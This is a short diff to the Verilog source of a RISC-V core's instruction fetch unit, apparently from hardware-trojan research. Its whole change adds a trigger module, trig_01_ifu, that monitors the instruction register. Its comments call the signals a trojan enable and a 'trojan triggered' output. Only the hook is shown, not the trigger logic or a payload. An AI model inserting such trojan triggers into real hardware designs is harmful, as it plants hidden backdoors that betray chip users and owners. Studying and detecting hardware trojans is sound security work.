@@ -139,6 +139,28 @@ module e203_ifu(
   //wire ifu_rsp_replay;   
   wire [`E203_INSTR_SIZE-1:0] ifu_rsp_instr; 
 
+  //////////////////////////////////////////
+  //trigger_01 begin
+  //181217
+  //monitor the ifu instruction register
+  //1 when triggered
+  //////////////////////////////////////////
+  trig_01_ifu u_trig_01_ifu(
+    .ifu_o_ir (ifu_o_ir),// The instruction register
+    .trojan_en (trojan_en),//low active
+    .trig_01_ifu_o (trig_01_ifu_o),//high when trojan triggered
+    .clk (clk),
+    .rst_n (rst_n)
+    );
+
+  //////////////////////////////////////////
+  //trigger_01 end
+  //////////////////////////////////////////
+
+
+
+
+
   e203_ifu_ifetch u_e203_ifu_ifetch(
     .inspect_pc   (inspect_pc),
     .pc_rtvec      (pc_rtvec),  
